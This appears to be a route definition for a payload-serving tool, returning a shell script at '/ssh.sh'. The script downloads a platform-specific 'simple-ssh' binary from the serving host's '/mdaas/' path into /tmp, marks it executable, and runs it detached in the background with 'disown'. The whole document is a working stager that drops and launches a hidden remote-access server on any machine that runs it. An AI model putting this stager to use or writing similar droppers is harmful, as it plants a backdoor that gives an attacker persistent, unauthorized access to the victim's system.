---
title: Simple SSH
description: Simple SSH (requires build of simple ssh server in static dir)
weight: 1
pattern: /ssh.sh$
is_final: true
data:
  headers:
    Content-Type: text/plain
  body: |
    DEST_FILE=/tmp/s
    if [ ! -f $DEST_FILE ]; then
      OS=$(uname)
      ARCH=$(uname -m)
      curl {{.Request.Host}}/mdaas/$OS/$ARCH/simple-ssh > $DEST_FILE
      chmod +x $DEST_FILE
    fi
    bash -c "$DEST_FILE & disown" &
    disown
---
